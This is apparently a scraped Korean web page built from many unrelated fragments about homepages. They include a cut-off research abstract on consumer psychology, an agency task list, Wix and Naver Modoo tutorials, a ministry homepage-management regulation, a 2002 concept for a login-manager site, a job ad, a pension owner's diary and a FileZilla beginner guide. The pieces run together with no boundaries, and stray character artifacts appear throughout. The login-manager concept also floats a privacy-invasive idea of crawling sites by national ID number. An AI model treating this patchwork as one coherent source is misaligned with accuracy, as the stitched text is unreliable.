없다는 것을 발견했다. 즉, 사람들은 이종자 상황에 대한 소비 수준을 더 이상 향상시키지 않을 것임을 의미한다. 이 연구는 돈 지불의 실제 가치가 동일 할 때 증명하지만 가격 목록 방법에 따라 소비자의 총 소비량에 영향을 미친다. 실용적인 함의는 정부가 돈에 대해 이종 교섭을 채택 할 때 사람들의 소비 심리에 영향을 미친다는 것을 암시한다. 본 연구는 테러 관리 이론에 근거하여 사망률의 중요성이 소비자의 구매 의도와 물질적 제품 및 경험적 제품에 대한 태도 또는 태도에 어떤 영향을 미치는지 조사한다. 특히,이 연구는 사치의 중요성이 호화로운 재료 제품에 대한 태도 및 구매 의도를 증가시키는지를 이해하는 것을 목표로하며, 낮은 지위의 재료 제품에 대한 태도 및 구매 의사에 대한 사망률의 영향은 거의 없다. 그러나 경험 제품의 경우 제품의 상태에 상관없이 사망률의 중요성은 경험 제품에 대한 태도와 구입 의도를 증가시킨다. 연구 결과는 사망률 영향이 태도와 구매 의도에 미치는 영향을 물질적 제품과 경험적 제품간에 다르게 나타냅니다. 향후 연구를위한 제안과 함께 토론 및 실제적 함의가 제공됩니다.​ 1. 박스업 홈페이지 및 프로그래밍 개편 견적 발송2. 농업축산신문 12월 홈페이지관리 내역 전송3. 아산풍성한 영농조합 상품 정리4.S컨벤션 방문로그 분석보고5.메종드베르 방문로그 분석보고6.알엔지커뮤니티 베너 수정7.고객사 WR,WD,DS 블로그 점검​밝은 미래 동영상 편집 (예정)​ 네이버 블로그는 맞지만, 확인불가​﻿﻿윅스로 만드는 무료 홈페이지  지난 시간에 간단히 네이버 모두와 윅스 홈페지를 비교 분석해 보았습니다못보신분들은 요기로 http://blog.naver.com/smartlife4100/220552833967무료홈페이지만들기,윅스와 모두의 비교분석모두 홈페이지와 윅스홈페이지의 장단점홈페이지 다들 가지고 계신가요? 오늘은 홈페이지 만들기에 대해 알...blog.naver.com 오늘은 직접 회원 가입하며 시작해 보겠습니다 어떤것을 제작하거나 구성 추가기능이 많은것들은인터넷 익스플로러 보다는 크롬을설치하여크롬에서 시작하시는 게 좋습니다​컴퓨터에 크롬 설치하시고 시작하겠습니다​​주소창에 윅스라고 치면 아래에무료홈페이지 만들기 WIX라고 보이시죠 클릭해서 들어 갑니데이~​​​ㅈ주줒주​​그럼 이렇게 시작 페이지가 나오면 시작하기로 들어 갑니다 ​​​ㄱ그글그럼럼 ​그럼 이렇게 로그인 화면이 뜨는데 본인이 자주쓰는 이메일과 아이디로 시작하셔도 되고옆에 보듯이 페이스북계정이나 구글계정을 가지고 있는 사람은 바로 그쪽으로 들어 가셔도 됩니다 ~​​​ㄱ그글그럼럼 ​​​로그인 하고 들어 가면 대문이 또하나 나오네요요기문을 살포시 열고 들어 가 보세요당신이 보지 못했던 신세계가 펼쳐져 있답니다 ​​​ㄱ그글그렇​​정말 다양하고 멋진 템플릿들이테마에 따라 수십 수백개가 쌤플로이미 만들어 져 있는것이 보일것입니다 여러분은 아무 걱정 말고 여기 있는것중본인에게 맞는 템플릿을 선정하여 사진,동영상,텍스트,지도등 구성요소만바꿔 주시면 얼마든지 멋진 나만의 홈페이지가 만들어 진답니다 ​ㅈ저정모방은 창조의 어머니란 말이 있죠 먼저 남들이 만들어 놓은 멋진 쌤플들을 충분히 구경하시고 내가 만들 홈페이지의주제에 맞게 머리속으로 상상해 가며어떤 템플릿을 선택하여 구성 요소들을 어떻게 배열하고 바꿔 나가면 될지를 생각하시고 본인이 하고 있는 업종에 맞는 테마에 있는 템플릿을 선택합니다 보기 는 더 자세히 모델 하우스 둘러보듯 둘러 보시는 곳이고 다 둘러보고 직접 만들기를 시작하려면 편집으로 들어 가시면 이제 본격적으로 내가 만들어 갈수 있는 화면이 나타난답니다구성요소 하나하나 기능을 익히며 추가 하는것도 나중 천천히 해 보도록하겠습니다(지가 좀 바빠 언제가 될지는...)(모두 홈페지 만드는 포스팅도 마무리 해야는데 ...)컴퓨터좀 만질줄 아는 사람은 하나하나 눌러보고​ 갖다 넣어보면 대충 감이 오실겁니데이~​​​​모두 홈페이지 보다 윅스가  PC화면에서 훨씬 멋지게 보입니다 수백만원 돈 안들여도 나만의 홈페이지를 무료로 만들수 있다는것 매력적이지않나요 제작 ,관리,사이트 등록도 꽁짜면 전 돈 주고도 배워 평생 써먹겠습니데이~네이버 블로그는 맞지만, 확인불가저희 위드맘케어 안산/시흥 지사는 홈페이지 관리를 지사장이 직접 관리 작성함을 알립니다.​-후기 작성방법1. 산모님들의 후기는 지사에 경로를(카페명, 작성일자 등) 알려주시면 저희가 직접복사하거나 캡쳐하여 홈페이지에 작성합니다.​2. 산모님들께서 직접 복사 또는 캡쳐를 하셔서 보내주시면 홈페이지에 작성합니다.​3. 유선 상으로 후기 내용을 말씀해 주시면 저희가 홈페이지에 직접 작성합니다.​모든 방법은 산모님들의 편의를 위한 조치이며, 육아의 바쁜 일상으로인해 후기 작성에 어려움을 격고 계시다고 호소하시는 분이 많으셔서 이 같이 조치를 취합니다.​또한 홈페이지 관리 대행업체를 통하지 않기 때문에 실제 후기가 적을 수 있음을 알려드립니다.​끝으로 산모님과 아기를 위해 더욱더 노력하는 위드맘케어가 되겠습니다.감사합니다. 홈페이지 관리할 용도로 배워두면 좋을 프로그램 언어는 뭘까요 | 전문 지식 검색은 아...프로그래밍, 프로그래밍 - 홈페이지 만들고 또 관리할 목적으로 공부하고 싶은데 어디서부터 시작해야 될지 모르겠네요외관 만드는 것부터 서버까...www.a-ha.io홈페이지 만들고 또 관리할 목적으로 공부하고 싶은데 어디서부터 시작해야 될지 모르겠네요외관 만드는 것부터 서버까지 건드려야 한다면 어떤 것들을 배우면 도움이 될까요#홈페이지개발  #홈페이지만들기  #개인홈피  #프로그래머  #프로그래밍  #HTML  #CSS  #자바스크립트 #서버언어						최초 작성일 : 2002. 04. 10 로그인 관리 홈페이지0. 문제제기 - 사람들이 많은 사이트에 가입하지만 정작 자신이 어디어디에 가입했는지 조차 잊어버린다.그리고 심지어는 암호를 잃어버리기도 한다.이 문제를 해결하기위해 소프트웨어가 있으나,대부분 자기 컴퓨터외에는 설치가 불가능하다.1. 개념- 웹에서 직접 로그인 아이디를 관리 해주는 사이트- 하나의 아이디로 자신이 쓰는 모든곳을 통과시켜준다.2. 대강의 기능1) 본 웹사이트에 먼저 로그인한다.2) 사용할수 있는 기능- 개인정보 변경/탈퇴 : 일반적인 사이트와 동일- Home 설정 : 로그인하면 웹브라우져의 첫페이지처럼 설정할수 있다.- Myfavorite 편집 - 추천사이트- 가입한 곳 찾아보기- 메일 보내기/받기3) 로그인 후에는 창 최상단에 heigt*10정도의 메뉴바가 생성된다.아래는 모두 창으로 이용된다. 브라우져내의 브라우져라고 생각하면 되겠다.다만, 모든 정보는 브라우져가 아닌 서버에 암호화되어 저장된다.메뉴의 내용- 내 정보 : 1) 개인정보 수정 2) 내가 여태껏 사용했던 사이트들의 정보 보여주기흐름을 볼수 있다. 이 정보는 모두 서버에 저장되며 이를 이용하여 CRM에 이용할수 있다. 3) 메일 설정(외부메일을 지원하여 외부메일을 받아온다./ 웹진 수신여부설정)4) 가입한곳 찾아보기 : 이 기능은 주민등록번호를 토대로 로봇이 돌아다니며사이트들을 돌아다녀서 가입한 사이트를 찾아준다. 결과물이 나오는데는시간은 꽤 오래 걸린다.(기술적 문제가 가장걸린다. --;)- 현재 이용중인 사이트 주소 : 현재 이용중인 사이트의 주소가 표기된다.- 받은 메일 표시 : 클릭하면, 메일리스트를 보여준다.- 즐겨찾기 추가 버튼 : 즐겨찾기에 추가된다. (그룹관리 지원)- 즐겨찾기 이동 : 즐겨찾기는 자주 찾는 것이 상단으로 이동되어 빠른 이동성을 도모한다.- 자동 로그인 설정 :클릭시 로그인 설정 페이지로 이동한다.자신이 가입되있는 홈페이지 리스트가 나온다.- 자동로그인 / 아이디만 자동입력 / 아무것도 적지않음 (사이트마다 설정할수 있다)- 추천사이트 : 광고성이 짖다. 다만, 내 정보의 인터넷이용의 CRM을 통해 사용자에게 맞는 사이트를 추천해준다.3. 수익성- 웹진 서비스를 이용하여 수익창출- 광고베너, 추천사이트 등록4. 문제점 : 1) 웹서핑중 가입이나 사용시 어떻게 아이디와 비밀번호를 추출하느냐... 기술문제2) 컴퓨터에 흔적을 안남기는 보안문제 , 해킹대비3) 가입한곳을 찾아보기 : 기술적 문제의 난점... 미래창조과학부 홈페이지 관리·운영 규정  제정 2014. 3. 28  미래창조과학부훈령 제109호   제1장 총칙 제1조(목적) 이 지침은 미래창조과학부 인터넷 홈페이지의 효율적인 운영과 관리에 필요한 사항을 규정함으로써 미래창조과학부 정책홍보를 강화하고 대국민 서비스의 개선을 목적으로 한다. 제2조(적용범위) ① 이 지침은 미래창조과학부 인터넷 홈페이지(이하 "홈페이지"라 한다)의 관리·운영 업무에 적용한다.  ② 홈페이지 관리·운영에 관하여 다른 훈령·고시 등에 특별히 정한 경우를 제외하고는 이 규정에 따른다. 제3조(용어의 정의) 이 지침에서 사용하는 용어의 뜻은 다음과 같다.  1. "미래창조과학부 홈페이지"란 미래창조과학부를 대표하여 일반인에게 각종 정보 및 서비스를 제공하기 위하여 인터넷에 www.msip.go.kr의 URL에 구축한 웹사이트를 의미하며 인터넷에서 미래창조과학부를 대표한다.  2. "홈페이지 운영"이란 홈페이지의 구축, 운용, 개선, 개발, 폐지, 유지관리 등 운영 전반에 관한 사항을 총칭한다.  3. "웹접근성"이란 장애인뿐만 아니라 모든 사람이 홈페이지에서 제공하는 모든 서비스를 손쉽게 활용할 수 있도록 하는 것을 말한다.  4. "자료"란 대국민 서비스를 위하여 홈페이지에 등록되는 모든 내용을 말한다.  5. "게시물"이란 미래창조과학부 홈페이지를 이용하는 자가 게시하는 모든 내용을 말한다.  제2장 홈페이지 운영체계 제4조(관리체계) ① 기획조정실장은 홈페이지의 구축·운영에 관한 기본사항을 총괄·조정한다.  ② 홈페이지의 구축 및 효율적인 관리의 책임은 정보화담당관(이하 "관리책임자"라 한다)이 수행한다.  ③ 홈페이지에 게시되는 자료의 효율적 관리를 위하여 대변인을 총괄운영책임자로 지정하고, 주요 메뉴별로 홈페이지 운영책임자(이하 "분임운영책임자"라 한다)를 둔다.  ④ 홈페이지에 게시되는 메뉴의 주관 부서가 모호한 경우에는 대변인이 분임운영책임자를 직접 지정할 수 있다. 제5조(관리책임자의 임무) 관리책임자는 다음 각 호의 업무를 수행한다.  1. 홈페이지 시스템의 구축·유지에 관한 계획 수립  2. 홈페이지 시스템의 구축·유지 예산에 관한 사항  3. 홈페이지 시스템의 유지보수 및 교육  4. 홈페이지 시스템과 콘텐츠 연계를 위한 표준에 관한 사항  5. 자료유실에 대비한 주기적인 백업 및 보안대책 강구  6. 기타 홈페이지 시스템 관리에 관한 사항 제6조(총괄운영책임자의 임무) 총괄운영책임자는 다음 각 호의 업무를 수행한다.  1. 홈페이지 화면재설계, 디자인 변경 등 콘텐츠에 관한 계획 수립  2. 홈페이지 콘텐츠 개선 및 관련 예산에 관한 사항  3. 홈페이지 게시자료 선정, 운영실태 파악 및 평가  4. 주요 메뉴별 홈페이지 분임운영책임자의 지정  5. 홈페이지 관리·운영에 관한 지침 제·개정   6. 기타 홈페이지 운영에 관한 사항 제7조(분임운영책임자의 임무) 분임운영책임자는 다음 각 호의 업무를 수행한다.  1. 담당 메뉴의 자료 등록 등 운영에 관한 사항  2. 최신 자료의 갱신 및 발굴에 관한 사항  3. 게시물 점검 및 민원처리에 관한 사항  4. 기타 홈페이지 운영에 필요한 자료 요청 시 협조 등  제3장 홈페이지 구축 및 운영 제8조(홈페이지 구축) 총괄운영책임자 또는 관리책임자가 홈페이지를 구축·개선하고자 할 경우 다음 각 호의 요건이 충족되도록 하여야 한다.  1. 미래창조과학부의 홈페이지임을 식별할 수 있도록 기관명·기관로고 등을 포함하여 정부기관으로서의 대표성과 신뢰성을 유지할 수 있어야 한다.  2. 대국민 서비스제고 및 정책참여 등을 고려하여야 한다.  3. 홈페이지 구성의 일관성 및 통일성을 가져야 한다.  4. 장애인 및 정보화 소외계층 등을 고려하여 웹접근성을 준수하여야 한다.  5. 이용자의 문의사항에 대비하여 대표연락처(부서, 기관명, 전화번호 등)를 명기하여야 한다.  6. 홈페이지의 성능과 안정성,  유지·보수의 편의성을 고려하여야 한다.  7. 최신기술 등의 동향을 분석하여 보편적이고 표준화된 기술을 적용하되 장래의 요구사항도 충분히 고려하여야 한다.  제9조(홈페이지 운영계획의 수립) ① 총괄운영책임자는 매년 해당 연도에 추진할 홈페이지의 운영계획을 수립하여야 한다. ② 홈페이지 운영계획에는 다음 각 호의 사항이 포함되어야 한다.  1. 홈페이지 운영의 기본방향에 관한 사항  2. 홈페이지 개선, 콘텐츠 개선에 관한 사항  3. 홈페이지 홍보에 관한 사항  4. 기타 홈페이지 운영에 관한 중요사항 제10조(홈페이지 운영) ① 분임운영책임자는 홈페이지에 항상 최신의 자료가 제공될 수 있도록 하여야 한다. ② 총괄운영책임자는 홈페이지를 통해 국민의 의견을 수렴하고 이를 홈페이지 운영에 적극 반영하여야 하며, 운영환경을 지속적으로 개선하여야 한다. ③ 홍보 팸플릿, 책자, 보도자료 등 미래창조과학부가 생산하는 모든 자료에는 홈페이지 주소(www.msip.go.kr)를 표기하여야 한다. 제11조(평가 및 개선) ① 총괄운영책임자는 주기적으로 홈페이지 운영 실태를 점검·평가하여 미흡한 부분에 대해서는 적절한 조치를 강구하는 등 홈페이지의 효율적인 운영과 활용도 제고를 도모하여야 한다. ② 관리책임자는 새로운 정보기술을 신속히 도입하여 국민에게 다양하고 편리한 서비스를 제공하도록 하여야 한다. ③ 총괄운영책임자는 제1항 결과에 따라 예산의 범위 내에서 포상하거나 성과평가에 반영할 수 있다. 제12조(서비스의 중단) ① 관리책임자는 다음 각 호에 해당하는 경우 홈페이지 서비스의 전부 또는 일부를 중단할 수 있다.  1. 홈페이지 기능 개선을 위한 정기점검의 경우  2. 시스템의 장애 등으로 서비스의 제공을 중단할 필요가 있을 경우  3. 천재지변 또는 국가비상사태로 인해 서비스를 중단할 필요가 있는 경우  4. 기타 서비스 중단이 불가피한 경우 ② 서비스의 전부 또는 일부가 중단될 경우 관리책임자는 사전에 중단사유, 중단시간 등의 안내정보를 홈페이지에 게시하여야 한다. 단, 불가항력의 사유로 인한 서비스 중단은 제외한다. ③ 서비스가 중단되었을 경우, 빠른 시간 내에 서비스를 제공할 수 있도록 최선의 노력을 하여야 한다. 제13조(메뉴의 구성) ① 총괄운영책임자는 미래창조과학부 정책홍보 및 국민 서비스 강화를 위하여 다음 각 호와 관련된 메뉴를 구성하여 운영하여야 한다.  1. 미래창조과학부의 소개, 공지사항 등의 알림 내용을 위한 메뉴  2. 국민의 다양한 의견수렴을 위한 국민참여 및 민원처리를 위한 메뉴  3. 미래창조과학부 주요정책 및 통계자료 등의 자료제공을 위한 메뉴  4. 최신 과학기술 및 정보방송통신 관련정보 제공을 위한 메뉴  5. 기타 운영에 필요한 메뉴 제14조(메뉴의 설치·변경) ① 총괄운영책임자는 홈페이지 이용자의 편리성 제고 및 운영의 효율성을 위하여 구성된 메뉴를 신규설치 혹은 변경하여 운영할 수 있다. ② 홈페이지에 새로운 메뉴를 개설하고자 하는 부서는 개설이유, 메뉴의 위치, 화면구성 및 주요내용 등에 관하여 담당자 및 담당부서장과 협의를 거친 후 별지 제1호 서식에 따라 총괄운영책임자에게 메뉴 개설을 요청하여야 한다.  ③ 홈페이지 메뉴 구성은 총괄운영책임자가 총괄하되, 이용자의 편의를 위하여 메뉴체계를 효율적으로 구성하여야 한다. 제15조(연계관리) ① 타 기관에서 홈페이지 콘텐츠 연계를 요청할 경우, 담당부서에서는 콘텐츠 제공의 필요성 및 연계방법 등에 대해 검토한 후 연계가 필요하다고 인정될 경우에는 총괄운영책임자에게 홈페이지 연계를 요청하여야 한다. ② 타 기관의 홈페이지를 연계하여 서비스하거나 정보를 제공하도록 허용할 경우에는, 이에 대한 저작권 등 책임의 소재를 명확히 하여야 한다. ③ 총괄운영책임자는 연계된 타 기관 홈페이지 운영상황을 분석·평가하여 활용실적이 미흡하거나 홈페이지의 내용이 충실하지 않다고 판단될 경우 링크를 삭제하는 등의 조치를 취할 수 있다.  제4장 홈페이지 자료관리 제16조(자료실명제) 홈페이지에 등록되는 자료에는 작성자의 성명과 소속부서, 전화번호 등을 명시하여야 하고 자료내용에 수반하는 제반 사항에 대해서는 작성자가 책임을 진다. 제17조(자료의 등록·수정·삭제) ① 자료를 생산한 부서는 해당 자료의 홈페이지 게시여부를 검토하여야 한다. ② 홈페이지에 자료를(단순자료 제외) 게시할 경우 해당 부서장의 확인을 받은 후 게시하여야 하며, 자료 등록 등을 수행함에 있어 특별한 기술을 요하는 경우 관리책임자는 이를 적극 지원하여야 한다. ③ 자료를 생산한 해당 부서가 자료를 홈페이지에 등록·수정·삭제(이하 등록 등이라 한다)할 경우에는 분임운영책임자에게 요청하여야 한다. ④ 총괄운영책임자는 홈페이지 운영상 필요한 경우, 해당 부서에 관련 자료를 요청할 수 있고 요청을 받은 부서는 특별한 사정이 없는 한 이에 응하여야 한다. ⑤ 운영책임자가 자료를 등록할 경우 주민등록번호, 여권번호 등 「공공기관의 정보공개에 관한 법률」 제9조제1항의 비공개 대상정보는 등록하여서는 안 된다. 제18조(영문홈페이지 자료 등록) ① 국제협력관은 미래창조과학부 정책자료 등 국외 홍보를 위해 필요한 영문자료를 영문홈페이지에 게시·운영하여야 한다.  ② 각 실·국에서 게시하는 정책자료 등은 해당 실·국에서 국제협력관에 영문자료 작성을 요청한다. ③ 국제협력관은 각 실·국에서 요청한 자료를 영문으로 작성하여 해당 담당부서에 통보한다. ④ 해당 실·국은 영문으로 작성된 자료를 검토한 후 국제협력관에 통보하여 영문 홈페이지에 게시될 수 있도록 한다. 제19조(게시물삭제) ① 총괄운영책임자는 홈페이지의 효율적인 운영을 위하여 다음 각 호에 해당하는 게시물의 경우 이를 삭제할 수 있다.  1. 특정개인, 단체(특정종교 포함) 등에 대한 비방   2. 욕설, 음란물 등 불건전한 내용  3. 홍보, 선전, 광고 등 상업적인 게시   4. 근거 없는 유언비어, 선동적인 내용   5. 유사, 동일한 내용을 반복적으로 게시한 경우  6. 기타 해당란의 설정취지에 부합되지 않은 경우 등  ② 총괄운영책임자는 게시물을 삭제할 경우 별지 제2호서식의 삭제사유와 근거규정을 게재하고, 삭제자료의 사본은 별도 관리하여야 한다. 제20조(행정정보 제공) ① 행정정보 공개대상 정보는 그 성격을 고려하여 홈페이지 등 국민이 쉽게 접근할 수 있는 다양한 방법으로 공개하여야 한다. ② 공개되는 자료는 비밀자료 및 개인정보 등의 정보가 유출되지 않도록 공개 전 반드시 점검하여야 하며, 정보제공에 따른 문제는 제공 부서에서 책임을 진다. ③ 그 밖의 홈페이지를 통해 제공되는 정보공개에 관한 사항은 공공기관의 정보공개에 관한 법률 제7조에 따른다. 제21조(민원서비스 제공) ① 총괄운영책임자 및 관리책임자는 홈페이지를 통하여 국민이 민원신청과 처리, 민원상담 등의 민원서비스를 이용할 수 있도록 하여야 한다. ② 민원처리에 따른 세부절차 및 방법 등은 미래창조과학부 민원처리 절차에 따른다. 제22조(알림판 및 배너관리) ① 특정한 사항을 홍보하기 위한 팝업창(pop-up window) 혹은 배너(banner)를 홈페이지에 게재하고자 하는 자는 별지 제3호 서식을 작성하여 관리책임자에게 게재를 요청하여야 한다. ② 총괄운영책임자는 내용, 형식, 업무관련성 등을 참작하여 게재 여부를 결정한다. ③ 팝업창 혹은 배너는 미래창조과학부 업무와 직접적으로 관련된 공적인 목적 이외에는 게시하지 못한다. 제5장 시스템 관리 및 보안 등 제23조(시스템 관리) ① 관리책임자는 홈페이지의 정상적 운영을 위하여 주전산기, 통신장비, 통신망 등의 관리를 하여야 한다. ② 관리책임자는 홈페이지 관리를 위탁받은 자를 지휘·감독하고 관리상황을 기록·유지하여야 한다. ③ 관리책임자는 기존 홈페이지를 대폭 개선할 필요가 있다고 판단될 경우, 홈페이지 보수계획을 수립하여 기획조정실장에게 보고 후 추진한다. 제24조(보안대책 및 자료백업) ① 관리책임자는 비인가자의 주전산기 접근 및 전자적 침해에 대비한 보안대책을 강구하고, 홈페이지 관리를 위탁받은 자로 하여금 수시로 이를 점검하도록 지시·감독 하여야 한다. ② 관리책임자는 자료유실에 대비하여 자료의 백업계획을 수립하고 이 계획에 따라 자료를 백업하여 별도 관리하여야 한다. 제25조(개인정보의 보호) ① 홈페이지 운영에 관련된 직원은 정당한 이유가 있는 경우를 제외하고, 직무상 알게 된 개인정보에 관한 사항을 누설하거나 타인의 정보를 제공하는 등 부정하게 사용하여서는 아니 된다. ② 관리책임자는 개인정보보호방침을 홈페이지 메인화면에 게시한다. 제26조(준용규정) 본 규정에서 특별히 정하지 않은 시스템관리 및 정보보호에 관한 사항은 「미래창조과학부 개인정보보호 지침」을 준용한다. 부 칙 이 지침은 발령한 날로부터 시행한다.[뮤플 채용]뮤플 채용 :: 뮤플닷컴 웹디자인/홈페이지 관리/웹마스터 모집(~05/27) 안녕하세요~ 뮤플 채용 정보를 알려드립니다.뮤플 채용이 까지 5월 27일 진행됩니다.이번 뮤플 채용은 웹디자인.웹마스터 대상으로 진행되는데요뮤플 채용에 관심있으신 분들 많으시죠?뮤플 채용과 관련해서 다양한 정보들을 준비했습니다.   먼저 뮤플 채용공고가 궁금하신 분들은 아래 링크를 클릭해주세요!  뮤플 채용공고 자세히 보러가기▶▶<< 뮤플 채용공고>>  지금까지 뮤플의 채용에 대해서 살펴봤습니다인크루트에서는 여러분의 뮤플의 합격을 응원하겠습니다취준생 여러분 뮤플 채용 화이팅!뮤플 채용공고 자세히 보러가기▶▶      #네이버모두홈페이지#modoo#펜션무료홈페이지 직접 제작 오늘 기어코 해 볼려고 한다.지금 시각 오후 10시 56분.#숙박사이트에 우리 펜션을 올리려고 하니 다들 물어보신다.#홈페이지 있으시냐고....홈페이지가 없어서 블로그를 홈페이지로 써도 되냐고 물으니 상관없다고 한다.그래서 지금까지 블로그를 홈페이지로 써왔다.​그런데.네이버에서 #무료홈페이지를 오픈했다는걸 최근에 알았다.​블로그로 홈페이지를 쓰고 싶으나네이버 모두 홈페이지의 가장 큰 장점으로 #네이버검색노출 가능한 홈페이지라는 거에서 망설여졌다.솔직히 지금 블로그 관리도 힘들어서.ㅜ,.ㅜ과연 홈페이지 관리까지 할 수 있을까..싶어서.​내 블로그는 아직 인지도가 낮은 편이라서상위노출이 어렵다.그러나 홈페이지라면 말이 다르겠다 싶어 힘들지만 홈페이지 오픈을 해볼려고 맘을 정리했다.​#모두홈페이지의 장점중 하나템플릿이 다양하다.​나같은 40대 아줌마도 따라가다 보면 만들어지는게 모두 홈페이지.​한번 시작해 보자.처음에 들어가면 나오는 모두 홈페이지나도 시작하기를 눌렀다. 두근두근 개인정보 몇가지 체크하니 가입완료되었고.드디어 #odoo시작하기​ 모두 시작하기를 누르면이런 메세지가 뜬다.난 톡톡으로 안내받기를 눌러주었다. 내 홈페이지에 딱 맞는 구성 추천란이 팝업으로 뜬다.여기에서..헉!!!  딱 막혔다.!!!!  으악!!1번부터 막혔다.1번부터!@@​홈페이지 제작을 위한 이미지가 얼마나 준비되어 있으세요????????​펜션을 계속 데코를 진행하고 있는 중이라서...​네... 그래요.만족할만한 사진이 없습니다ㅜㅜ  아...그렇게 오후 11시20분홈페이지 작성을 중간에 멈춘다.  내일 부지런히 #펜션인테리어에 집중해서사진 10장 이상 찍을만하게 #펜션데코에 집중해야겠다.​요즘 #펜션테라스를 #플렌테리어로 꾸밀려고 한다.#마크라메는 일도 배워본 적 없는 내가#유튜브를 보면서 첫 마크라메 #처녀작이 나왔다.예쁘지는 않아보이겠지만나로선 뿌듯하다.너무 촘촘한것 보다듬성듬성한 이미지를 좋아한지라.내 입맛에 맞게 만들었기에 나는 나름 만족한다. #평매듭만 가지고 이런 작품을 만들 수 있다니.마크라메에 홀릭한 분들의 마음을 이해 할 수 있겠다.나로서는 뜨개보다 마크라메가 시간을 절약해 줄거 같아서 해보았는데이걸 활용해서 테라스 커텐을 한번 도전해 보려고 한다.그건 조만간 올릴 수 있을거 같다.​홈페이지 이미지 올리기 위해내일은 더 부지런히 움직이게 되겠구나.내일엄나무랑 두릅좀 뜯어서펜션에서 바베큐 드실분들에게 장아찌좀 드릴려고장아찌 담글려고 했는데...내일 일정은 오늘 세워보나내일 일은 내일이 되어 봐야 안다.이렇게 나의 오늘 하루를 마무리 한다.​ 피아골 에버그린 펜션전라남도 구례군 토지면 피아골로 614 ​​​​ 홈페이지나 쇼핑몰을 운영하다 보면 이런저런 일로 수정할 일이 생기는데요.웹작업에 관련 아무런 지식이 없는터라 간단한 텍스트나 이미지 수정 같은 경우에도전문 업체나 전문가에게 비용을 지불하고 수정하는 겨우가 대부분일건데요.몇회 정도일지는 모르겠지만 단계별로 웹작업 관련 전문 지식이 없는 초보자들도간단한 텍스트 이미지 수정 같은 홈페이지관리방법이 가능하게끔필요한 정보 및 방법에 대해 한번 포스팅 해볼까 하네요~ㅎ그 첫번째 단계로 쇼핑몰이나 홈페이지관리방법에 필요한 준비물을 먼저 알아보도록 합니다~.1. FPT접속 프로그램 : 파일질라(filezilla)라는 프로그램을 추천하고요네이버에서 파일질라 라고 검색하면 대표 사이트가 나오고 사이트에서 다운 받으면 됩니다. 접속화면 첫화면인데요.좌측걸로 다운로드를 받으면 됩니다.특별한거 없이 그냥 다운 받아서 계속 다음~ 다음~ 해서 설치하면 끝....설치 완료 후 파일질라 화면입니다.파일질라 설치가 완료됐으면 맨위 파일/사이트관리자 매뉴를 클릭하면 위같은 화면이 나오는데요.하단쯤에 1번 새 사이트를 클릭해서 새롭게 접속할 FTP 정보를 입력합니다.2번은 FTP 접속 URL(IP)을 입력하고, 3번은 특별히 접속 포트가 있으면 입력하고 없으면그냥 입력 안하고 넘어갑니다.로그온 유형은 일반으로 변경한 후에 4번은 FTP 접속 계정 정보를 입력하면 됩니다.정보를 잘 입력했으면 이렇게 홈페이지 FTP에 접속이 완료된 화면~.2번째 HTML 편집기 : html 편집기는 굉장히 많은데요.간단한 수정 위주의 작업이고 초보자이기 때문에 윈도우에 기본으로 설치된"메모장"을 추천합니다.* 혹시라도 메모장 위치를 모르는 분들 계시면 메모장은c / windows / system32 폴더에 보면 notepad 프로그램이 있습니다. 그걸 바탕화면 같은곳으로 빼놓으면 되겠죠?메모장 처음 사용하는 경우라면 html 파일(css, php 등등)같은 홈페이지 소스 파일을메모장과 연결 작업을 해주는게 좋답니다.소스 파일을 더블클릭하거나 우클릭하면 연결 프로그램으로 해서 연결해주면 됩니다.이렇게 연결프로그램에서 메모장으로 체크하면 되고,* 매번 연결하기 귀찮으니 하단에 "이 종류의 파일을 열 때 항상 선택된 프로그램 사용(A)"체크하고 확인을 합니다.3. 이미지 편집 프로그램 : 포토샵 같은 전문 프로그램부터 윈도우 기본 프로그램"그림판" 등등 이미지 편집 프로그램은 무지 많은데요.포토샵 같은 이미지 편집 전문 프로그램을 다루면 좋겠지만 어렵다 생각이되면그랸 그림판으로도 해도 충분합니다ㅋ* 네이버에 "이미지 편집 프로그램" 검색하면 쉽게 이미지 편집을 할 수 있는다양한 프로그램이 많답니다.윈도운 기본 이미지 편집 프로그램 "그림판"==================================================================1. FTP 접속 프로그램2. html 편집기3. 이미지 편집 프로그램이렇게 3가지 준비물이 준비 되였으면 이제 초보자도 간단한 쇼핑몰이나 홈페이지관리방법/수정이가능한 상태가 되었습니다~.그럼 초보자의 쇼핑몰이나 홈페이지관리방법 첫번째 포스팅은 여기서 마무리하고다음 포스팅에서는 이 준비물로 간단한 홈페이지 수정하는 방법들에 대해서 포스팅을 해볼게요.안녕하세요다큐 사무기마트에서복합기임대기기관리프로그램 DOMS(돔스)홈페이지를 OPEN하였습니다.방문하시어 관련 솔루션에 대해서 궁금하신 내용 확인해 보세요. ​다양한 복합기 임대관리 기능을 제공합니다 온라인교육을 통하여 DOMS 사용법을 쉽게 확인할 수 있습니다. ​​ ​ 다큐 복합기 임대기기 관리 솔루션 - DOMS복합기 임대기기의 효율적 관리 Docu OA Management System DOMS는 복합기 임대 기기의 효율적 관리로 업무 성과를 극대화해 새로운 서비스를 창출할 수 있는 시스템입니다. Read More Previous Next 차별화된 기술력 다양한 브랜드의 복합기를 한번에 관리 가능한 DOMS의 기능을 확인해보세요. 제품문의 및 신청 사무기기 관리의 전문 컨설턴트가 온라인으로 상담부터 데모 시연까지 도와 드립니다. 돔스 온라인 교육 DOMS 사용법을 언제, 어디서나 필요시 접속하여 교육 동영상을 시청할 수 있습니다. D oc...www.doms.kr ​ 관리하는 쇼핑몰중에 한 업체이다.꾸준히 방문자 수가 증가하고 있다.하루광고 소진액은 :500원 정도이다.아직 오픈마켓쪽 위주로 자리잡기위해서 소홀히 하는 면이 있어 그만큼 투자를 아끼고 있다.하지만 하루 500원의 비용으로 이만큼의 방문자는 적은 숫자가 아닌것은 확실하다.최근들어 방문자수가 급격하게 늘었다.여러 입점과 홍보활동에서 이루어진 '키핑포인트'시점이 아닌가하는 생각이든다.이번 년도 하루방문자 1,000명 목표 꼭 이루어내자![셀러온 홈페이지 보러가기] ​ ​많은 분들이 온라인을 통해다양한 방법을 이용하여 마케팅을 진행하고 있어요지금은 온라인 마케팅은 선택이 아닌필수가 되어버렸는데요매출증대에 영향이 크게 가기 때문에병원 프랜차이즈 대기업 중소기업 개인까지많은 분들이 진행을 하고 계시는데요 매달 유튜브나 검색 광고 등다양한 광고를 진행하고 있는데별로 효과가 나타나지 않았다면마케팅 방법이 잘못되지는 않았는지 체크해봐야겠죠​특히 막 사업을 시작하신 분들은정말 다양한 곳에서 마케팅을 진행하시는데요요즘은 어딘가를 방문하기 전이나물건을 구입하기 전에믿을 